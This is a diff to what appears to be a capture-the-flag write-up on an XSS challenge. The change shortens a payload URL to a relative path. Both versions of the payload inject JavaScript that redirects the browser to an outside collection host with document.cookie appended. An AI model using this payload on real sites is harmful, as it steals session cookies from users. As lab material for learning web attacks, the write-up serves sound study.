@@ -84,7 +84,7 @@ We'll finish with a ``,'`` to retrieve the end of the function:
 
 Let's try if our payload works!
 
-Payload: ``http://172.17.0.2/dungeon/30/',document.location.replace('https://challenge.free.beeceptor.com/'.concat(document.cookie)),')``
+Payload: ``/dungeon/30/',document.location.replace('https://challenge.free.beeceptor.com/'.concat(document.cookie)),')``
 
 ## Testing locally
 
